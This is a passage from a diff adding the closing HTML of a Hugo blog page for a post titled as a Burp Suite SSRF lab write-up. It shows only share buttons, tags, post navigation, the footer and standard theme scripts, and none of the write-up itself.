+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAssrf/" data-title="burpsuite靶场ssrf" data-hashtags="ssrf"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAssrf/" data-hashtag="ssrf"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAssrf/" data-title="burpsuite靶场ssrf"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAssrf/" data-title="burpsuite靶场ssrf"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAssrf/" data-title="burpsuite靶场ssrf"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ssrf/">Ssrf</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAxxe/" class="prev" rel="prev" title="burpsuite靶场XXE"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>burpsuite靶场XXE</a>
+            <a href="/posts/ctf/python%E6%80%BB%E7%BB%93/" class="next" rel="next" title="python总结">python总结<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
